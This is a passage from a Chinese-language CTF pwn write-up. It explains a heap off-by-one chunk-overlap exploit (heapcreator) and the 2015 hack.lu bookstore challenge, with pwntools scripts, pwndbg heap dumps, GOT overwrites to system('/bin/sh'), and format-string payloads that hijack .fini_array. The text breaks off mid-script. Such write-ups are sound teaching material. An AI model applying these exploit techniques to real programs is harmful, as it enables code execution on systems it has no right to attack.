结构体就会用这个 chunk1 content 空间（为什么不用原来的？[小结](# 小结)）。当然也可以用其他大小，自行调试即可。这里举一个例子：chunk1 content size 0x30 ，溢出修改结构体 size 为：0x71 。</p><p>堆结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;20gx 0xac4000</span><br><span class="line">0xac4000:0x00000000000000000x0000000000000021</span><br><span class="line">0xac4010:0x00000000000000180x0000000000ac4030</span><br><span class="line">0xac4020:0x00000000000000000x0000000000000021</span><br><span class="line">0xac4030:0x61616161616161610x6161616161616161</span><br><span class="line">0xac4040:0x00000000000000000x0000000000000021</span><br><span class="line">0xac4050:0x00000000000000100x0000000000ac4070</span><br><span class="line">0xac4060:0x00000000000000000x0000000000000021</span><br><span class="line">0xac4070:0x62626262626262620x6262626262626262</span><br><span class="line">0xac4080:0x00000000000000000x0000000000020f81</span><br><span class="line">0xac4090:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>然后修改 chunk0 溢出修改下一个 chunk size，这里把 <code>/bin/sh\x00</code> 也一起写入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + <span class="string">&quot;\x41&quot;</span>)</span><br></pre></td></tr></table></figure><p>修改后 chunk1 结构体就将 chunk1 content 也包含进来了，释放的时候会放入 0x40 的 fastbin 中。</p><p>堆结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;20gx 0xac4000</span><br><span class="line">0xac4000:0x00000000000000000x0000000000000021</span><br><span class="line">0xac4010:0x00000000000000180x0000000000ac4030</span><br><span class="line">0xac4020:0x00000000000000000x0000000000000021</span><br><span class="line">0xac4030:0x0068732f6e69622f0x6161616161616161</span><br><span class="line">0xac4040:0x61616161616161610x0000000000000041&#x2F;&#x2F;chunk1 struct</span><br><span class="line">0xac4050:0x00000000000000100x0000000000ac4070</span><br><span class="line">0xac4060:0x00000000000000000x0000000000000021&#x2F;&#x2F;chunk1 content</span><br><span class="line">0xac4070:0x62626262626262620x6262626262626262</span><br><span class="line">0xac4080:0x00000000000000000x0000000000020f81</span><br><span class="line">0xac4090:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>释放 chunk1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0xac4060 ◂— 0x0&#x2F;&#x2F;chunk1 content</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0xac4040 ◂— 0x0&#x2F;&#x2F;chunk1 struct</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>将这两个空闲堆申请出来，由于 malloc 机制，申请相同大小的 chunk 才会用 fastbin 中空闲内存。0x20 会用作新 chunk 的结构体，0x40 会用作新 chunk 的 content 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x30</span>)+p64(free_got))</span><br></pre></td></tr></table></figure><p>这里为了方便用 chunk1’ 表示新申请的堆，实际上这个堆序号还是 1 ，堆结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;20gx 0xac4000</span><br><span class="line">0xac4000:0x00000000000000000x0000000000000021</span><br><span class="line">0xac4010:0x00000000000000180x0000000000ac4030</span><br><span class="line">0xac4020:0x00000000000000000x0000000000000021</span><br><span class="line">0xac4030:0x0068732f6e69622f0x6161616161616161</span><br><span class="line">0xac4040:0x61616161616161610x0000000000000041&#x2F;&#x2F;chunk1&#39; content</span><br><span class="line">0xac4050:0x61616161616161610x6161616161616161</span><br><span class="line">0xac4060:0x61616161616161610x0000000000000021&#x2F;&#x2F;chunk1&#39; struct</span><br><span class="line">0xac4070:0x00000000000000300x0000000000602018</span><br><span class="line">0xac4080:0x00000000000000000x0000000000020f81</span><br><span class="line">0xac4090:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>然后就是泄露 libc 地址，修改 GOT 表，最后触发 <code>system(&#39;/bin/sh&#39;)</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : heapcreator.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,context</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Heap : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;heap:&quot;</span>)</span><br><span class="line">p.send(context)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,context</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;heap :&quot;</span>)</span><br><span class="line">p.send(context)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-one</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x30</span>)+p64(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;free_addr:&quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>分配大小在 fastbin 范围内的新堆块，需要大小匹配用 fastbin 的空闲堆块。举个例子：fastbin 中有一个 0x20 的空闲堆块，需要分配一个 0x40 堆块，会从 topchunk 中分割 0x40 出来（如果可以）。</li></ul><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">题目链接</a></p><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><p>64 位动态链接的程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;3a15f5a8e83e55c535d220473fa76c314d26b124, stripped</span><br><span class="line"></span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h3><p>程序是一个买书的系统，最多只能购买两本书。每一本书都用一个独立的堆去维护，这个堆是程序自行申请的，不能人工干预的，固定大小为 0x80 。</p><p>可以新增、删除书籍，最后提交是会将两本书（两个堆）信息合并到一个新的堆中，然后进行输出。</p><h3 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><h4 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h4><p>录入书籍信息用一个自定义输入函数，这个函数存在一个堆溢出的问题。结束输入的判断标准是遇到 \n ，需要注意的是自定义输入函数会在输入字符串最后加上一个 \x00 ：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-UeGvjNWMx6CKidQp.png"></p><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>程序的删除函数只是将堆释放，并没有将指针置零：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-hPFo7mUDVdOY9rRM.png"></p><h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>程序退出打印信息时，会出现一个格式化字符串漏洞：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-3RqbLskHDRReG7NX.png"></p><h4 id="奇怪的输入长度"><a href="#奇怪的输入长度" class="headerlink" title="奇怪的输入长度"></a>奇怪的输入长度</h4><p>菜单选择输入长度上限为 0x80 ，这里不算是一个漏洞，但是会在后面利用当中运用到。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-S4UbIBlARivRMmeo.png"></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><blockquote><p>这条题目利用起来比较复杂，涉及到堆溢出、堆重叠、格式化字符串、劫持 fini_array 。下面先写出大致步骤</p></blockquote><ol><li>free book2</li><li>利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，劫持 fini_array 、泄露地址</li><li>第二轮运行程序： free book2</li><li>利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，修改返回地址为 one_gadget</li></ol><p>产生这种解题思路思考方向：先着眼简单、已经学过熟悉的漏洞，也就是格式化字符串这个漏洞。利用格式化字符串的话，就是修改 got 表或者返回地址等控制程序流程 getshell 。</p><ol><li>这里 格式化字符串 出现在最后一个 printf ，也就是输出完成之后程序就会退出。</li><li>格式化字符串的内容是从 submit  申请的 dest 中读取的。</li><li>用户无法自行分配堆，只能从程序本身申请的 3 块堆和 submit 功能设法利用。</li></ol><h4 id="控制格式化字符串内容"><a href="#控制格式化字符串内容" class="headerlink" title="控制格式化字符串内容"></a>控制格式化字符串内容</h4><p>先来解决格式化字符串内容的问题。内容是从 dest 中读取的，就要设法控制 dest  内容。这里利用的是 overlapping 堆重叠，将 chunk2 和 chunk3 重叠起来，利用 submit 复制功能溢出控制 dest 中的内容。</p><p>造成 overlapping 先 free chunk2 ，再通过写入 book1 功能溢出修改 chunk2 的 size 字段为 0x151 。这样当 submit 功能申请 0x140 堆块（不含chunk header）的时候就会去到 unsortedbin 中找到被我们修改大小为 0x151 的 chunk2 。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-1f1IV0WHxcpMxOvo.png"></p><p>submit 功能正常情况下复制的内容是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Order 1: &quot; + book1 + &quot;\nOrder 2: &quot; + book2 + &#39;\n&#39;</span><br></pre></td></tr></table></figure><p>但是我们将 chunk2 chunk3 重叠在一起，且 chunk header 是同一地址。简单点就是两个堆开始地址相同，结束地址不同。</p><p>chunk1 chunk2 地址指针运行过程中没有被二次赋值，一直保存着申请堆时的地址。（free chunk2 时因为有 UAF 漏洞，所以没被重置。）造成的影响就是 chunk2 的内容 submit 的时候被写为 <code>&quot;Order 1: &quot; + book1 </code>，详细过程如下：</p><ol><li><p>submit 处理 chunk1 信息，向 chunk3（即chunk2）写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Order 1: &quot; + book1</span><br></pre></td></tr></table></figure></li><li><p>submit 处理 chunk2 信息，向 chunk3（即chunk2）写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\nOrder 2: &quot; + &quot;Order 1: &quot; + book1 + &#39;\n&#39;</span><br></pre></td></tr></table></figure></li></ol><p>先看看 chunk1、chunk2（chunk3）、dest 三个堆的分布情况：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-waueydoBLLdD7QWO.png"></p><p>我们控制 chunk1 内容，写入有效 payload 和 padding ，将有效 payload 溢出写入到 dest （fd 指针处开始）。换句话就是我们希望图上 0xef3010 开始写入的内容，复制到 0xef3130 。可以得出计算公式：（”” 不算个数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 需要在复制第二个chunk1前，填充好0x90字节，也就是chunk2(3) fd开始到dest fd开始的距离，这样chunk1就会被复制到dest fd开始</span><br><span class="line">&quot;Order 1:&quot; + chunk1 + &quot;\n&quot; + &quot;Order 2:&quot; + &quot;Order 1:&quot; &#x3D;&#x3D; 0x90</span><br><span class="line"># 化简为</span><br><span class="line">chunk1 &#x3D;&#x3D; 0x90 - 28 &#x3D;&#x3D; 0x74</span><br></pre></td></tr></table></figure><p>得出结论：将有效 payload 写在 chunk1 开头，然后将 chunk1 用非 \x00 填充长度为 0x74 ，当submit 的时候，有效 payload 就会放在 dest 的 fd 。这样就获得一个任意读写的格式化字符串，需要利用格式化字符串泄露、修改提前在修改 chunk1 时写入即可。</p><p>目前得出 payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span><span class="comment">#格式化字符串</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x74</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br></pre></td></tr></table></figure><h4 id="劫持-fini-array"><a href="#劫持-fini-array" class="headerlink" title="劫持 fini_array"></a>劫持 fini_array</h4><p>格式化字符串内容已经设法控制了，但是 getshell 需要两次使用这个漏洞，一次泄露地址，一次修改地址。</p><p>这里就需要用到一个知识，main 函数是二弟，他有大哥，有三弟。程序开始先运行一次大哥，在运行 main ，最后运行三弟。三弟当做有个数组：<code>.fini_array</code> 。程序退出后会执行 <code>.fini_array</code> 地址出的函数，不过只能利用一次（动态链接程序）。</p><p>所以我们可以在格式化字符串的第一轮泄露地址的同时，修改 .fini_array 的地址为 main 函数地址，让程序重新运行一次。main 函数地址易知，关键是 .fini_array 地址怎么找。</p><blockquote><p>动态链接与静态链接查找和利用有差别，为了篇幅将两者区别放在最后。对 64 位静态程序劫持 fini_array 有兴趣可以看看：<a href="https://www.mrskye.cn/archives/173/">劫持 64 位 fini_array 进行 ROP 攻击</a></p></blockquote><h5 id="Way-1"><a href="#Way-1" class="headerlink" title="Way 1"></a>Way 1</h5><p>IDA 中 <code>Ctrl+S</code> 查找 .fini_array 地址，可以看到这个数组空间大小为 8 字节，只能放一个地址，这是与静态程序的一个区别（静态有两个地址）。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png"></p><h5 id="Way-2"><a href="#Way-2" class="headerlink" title="Way 2"></a>Way 2</h5><p>用 gdb 调试程序，输入 <code>elf</code> 查找 .fini_array </p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png"></p><p>要素具备但是遇到一个问题，格式化字符串的内容是存放在堆上，栈上面只有该堆的指针而已。类似题目：ctf-wiki 的<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example-zh/#_22">堆上的格式化字符串漏洞</a> 。</p><p>这道题目我们不搞栈迁移到堆上面，而是利用菜单的奇怪输入长度，将地址写入到栈上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为了对齐前面填充8字节用来放菜单选项，fini_array偏移为13</span></span><br><span class="line"><span class="comment"># 泄露libc可以用__libc_start_main也可以和我一样自己往栈上写一个</span></span><br><span class="line">payload2 = <span class="string">&#x27;5&#x27;</span>*<span class="number">8</span> + p64(fini_array) + p64(free_got)</span><br><span class="line">p.recvuntil(<span class="string">&quot;5: Submit\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure><p>泄露 libc 地址和劫持 fini_array payload 目前构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&quot;%2617c%13$hn&quot;</span> + <span class="string">&#x27;|&#x27;</span> + <span class="string">&quot;%14$s&quot;</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x74</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br></pre></td></tr></table></figure><h4 id="修改-main-函数返回地址"><a href="#修改-main-函数返回地址" class="headerlink" title="修改 main 函数返回地址"></a>修改 main 函数返回地址</h4><p>到这里我们就获取了 libc_base 地址并且进入了第二次的 main 函数。下一步就是如何利用了。</p><p>就 free got 表改为 onegadget ？在这里不行，因为修改玩之后需要触发，也就是再一次进入 main 函数触发 free 函数。第二次进入 main 函数实际上是在 __libc_csu_fini 这个退出函数中调用 fini_array 数组中存储的函数（main），当执行完 main ，就会继续完成退出函数，然后正常退出程序。</p><p>这里有两个思路：</p><ol><li>同第一次 mian 中，泄露出栈地址，通过调试获取到第二次 main 的返回地址与泄露栈地址的偏移，就可以获取到 main rip 的栈地址，我们对此进行修改。</li><li>修改退出函数当中某个函数的 got 表，当完成退出函数调用这个函数就会 getshell。</li></ol><p>第二种思路是有几次比赛出现过这种利用方法，但没有在这道题目上尝试，主要是太费劲了。这道题就用第一种方法，就是需要我们泄露出 栈地址 ，然后因为栈结构固定，所以通过偏移算出第二 main 函数的返回地址。</p><p>通过调试查看第一个 main 函数的栈空间结构体：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-7YehpeGp46LWyAuO.png"></p><p> 在格式化字符串的时候把这个地址也泄露出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&quot;%2617c%13$hn&quot;</span> + <span class="string">&#x27;|&#x27;</span> + <span class="string">&quot;%14$s&quot;</span> + <span class="string">&#x27;-&#x27;</span> + <span class="string">&quot;%24$p&quot;</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x74</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br></pre></td></tr></table></figure><p>再次通过调试找到第二次 main 函数返回地址，然后计算固定偏移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffea45d8980</span>-<span class="number">0x7ffea45d887a</span>=<span class="number">0x106</span></span><br></pre></td></tr></table></figure><p>所以得出计算公式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret_addr 为泄露地址</span></span><br><span class="line">attack_addr = ret_addr - <span class="number">0x106</span></span><br></pre></td></tr></table></figure><p>第二次进入 main 函数的利用思路就出来了，和第一次进入一样，先释放 chunk2 造成 overlapping 堆重叠，控制 dest 内容从而控制格式化字符串内容。利用格式化字符串修改第二次 main 函数的返回地址为 onegadget 。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : books.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;5: Submit\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(cmd))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">cmd,content</span>):</span></span><br><span class="line">  